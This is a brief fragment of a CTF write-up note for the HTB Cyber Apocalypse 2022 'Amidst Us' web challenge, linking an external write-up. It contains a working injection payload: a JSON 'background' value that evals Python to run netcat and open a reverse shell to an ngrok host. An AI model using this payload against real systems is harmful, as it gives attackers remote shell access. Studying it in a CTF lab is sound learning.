...
Flavor Text:
```
I did not solve this one during the event. I did find this succinct writeup and wanted to record it as I like the injection and payloads used: https://github.com/SovietBeast/CTF-writeups/blob/main/HTB-CyberApocalypse-2022/Amidst%20Us.md
...
Attachments : [web_amidst_us.zip](web_amidst_us.zip)
...
"background":["eval(\"__import__('os').system('nc 2.tcp.ngrok.io 16106 -e /bin/sh')\")",
255,
255]
}
```
